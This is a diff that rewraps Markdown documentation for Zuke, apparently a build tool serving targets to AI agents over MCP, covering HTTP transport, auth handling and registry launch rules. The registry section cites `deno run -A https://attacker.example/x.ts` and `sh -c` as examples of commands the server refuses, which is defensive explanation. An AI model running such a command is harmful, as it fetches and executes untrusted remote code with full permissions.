@@ -48,8 +48,8 @@ Any client also takes the command directly. For example, with Claude Code:
 claude mcp add zuke -- deno run -A build.ts mcp
 ```
 
-Any client that speaks stdio MCP works the same way — give it the command
-`deno run -A build.ts mcp` (add `--allow-run` when you want the agent to execute
+Any client that speaks stdio MCP works the same way — give it the command `deno
+run -A build.ts mcp` (add `--allow-run` when you want the agent to execute
 targets). That is the command `zuke setup --mcp` writes too: it is the same on
 every platform and needs only Deno on the machine the client runs on.
 
@@ -64,8 +64,8 @@ zuke mcp --http 0.0.0.0:7777         # all interfaces — token or mcpAuth()
 ```
 
 Each request is a `POST` whose body is one JSON-RPC message; the response is
-that message's JSON-RPC reply. A notification (no `id`) is answered
-`202 Accepted` with no body. Zuke never initiates server→client messages, so the
+that message's JSON-RPC reply. A notification (no `id`) is answered `202
+Accepted` with no body. Zuke never initiates server→client messages, so the
 optional server-sent-events stream is not implemented — a `GET` is answered
 `405`, and clients fall back to POST-only (which is spec-compliant). For the
 single-build server, messages are processed **one at a time**, mirroring stdio,
@@ -192,9 +192,9 @@ token".
   audit log or any output.
 - **Confirmation — `--confirm-destructive`.** A destructive run tool (any target
   that is not `.readOnly()`) called without `confirm: true` returns its resolved
-  **plan** instead of executing, prompting the caller to re-send with
-  `confirm: true`. One round-trip, no server-side state; a `dryRun` skips the
-  gate, and read-only targets are exempt.
+  **plan** instead of executing, prompting the caller to re-send with `confirm:
+  true`. One round-trip, no server-side state; a `dryRun` skips the gate, and
+  read-only targets are exempt.
 
 ```sh
 # Expose everything to run, but gate promoteToProd behind an operator token
@@ -410,11 +410,10 @@ a message to stderr and **exit 1** rather than letting one silently win.
 | `challenge` | Optional `WWW-Authenticate` header value.                                                                                 |
 
 A `status` outside `400`–`499` — or a non-integer, or none at all — **collapses
-to a bare `401`**
-(`{ status: 401, error: "Unauthorized", challenge: "Bearer" }`). The rule exists
-so an authenticator cannot turn its own refusal into a success at the transport:
-a returned `status: 200` would otherwise answer `200` to a request the build
-meant to deny.
+to a bare `401`** (`{ status: 401, error: "Unauthorized", challenge: "Bearer"
+}`). The rule exists so an authenticator cannot turn its own refusal into a
+success at the transport: a returned `status: 200` would otherwise answer `200`
+to a request the build meant to deny.
 
 ### The refusal a client sees (behaviour change)
 
@@ -470,11 +469,11 @@ a build that wants to branch on who launched it).
 
 ### Telling a client where to authenticate
 
-Verifying a token only helps a client that already has one. A fresh
-`claude mcp add --transport http <url>` has nothing, and no way to guess where
-to get one — so it asks, the way OAuth 2.0 defines: it reads the
-`WWW-Authenticate` challenge on the `401`, fetches the metadata document that
-challenge names, and finds the authorization server there.
+Verifying a token only helps a client that already has one. A fresh `claude mcp
+add --transport http <url>` has nothing, and no way to guess where to get one —
+so it asks, the way OAuth 2.0 defines: it reads the `WWW-Authenticate` challenge
+on the `401`, fetches the metadata document that challenge names, and finds the
+authorization server there.
 
 `mcpProtectedResource()` publishes that document. Zuke is only ever the
 **resource**: it issues no tokens and hosts no `/authorize`, `/token` or
@@ -666,10 +665,10 @@ zuke mcp --registry --allow-run
   code as the server's user.
 - **A `command` location is gated the same way.** Its argv is not "code already
   on the machine" the way a local module path is: whoever wrote the entry chose
-  the program **and its arguments**, so
-  `deno run -A https://attacker.example/x.ts` is the refused remote-module case
-  spelled as a command, and `sh -c …` is arbitrary code with no fetch at all. A
-  command location is therefore refused unless its program appears in
+  the program **and its arguments**, so `deno run -A
+  https://attacker.example/x.ts` is the refused remote-module case spelled as a
+  command, and `sh -c …` is arbitrary code with no fetch at all. A command
+  location is therefore refused unless its program appears in
   `ZUKE_REGISTRY_LAUNCH_COMMANDS` (comma-separated, since a program path may
   contain a space; `*` allows any). The entry must match `command[0]`
   **exactly**, case-folded — deliberately not by basename, because the
@@ -755,8 +754,8 @@ tool argument is masked in the [audit log](#audit-log) too.
   message per `POST` over the [HTTP transport](#http-transport) (`--http`).
 - **Lifecycle:** the server answers `initialize` (echoing the client's requested
   `protocolVersion`), `notifications/initialized` (no reply), `ping`,
-  `tools/list`, and `tools/call`. Unknown requests get a JSON-RPC
-  `-32601 Method not found`; notifications never get a reply.
+  `tools/list`, and `tools/call`. Unknown requests get a JSON-RPC `-32601 Method
+  not found`; notifications never get a reply.
 - **Protocol revisions:** `2025-11-25` (the newest offered), `2025-06-18`,
   `2025-03-26` and `2024-11-05`. A client's requested version is echoed when
   this server implements it, and otherwise answered with the newest — the client
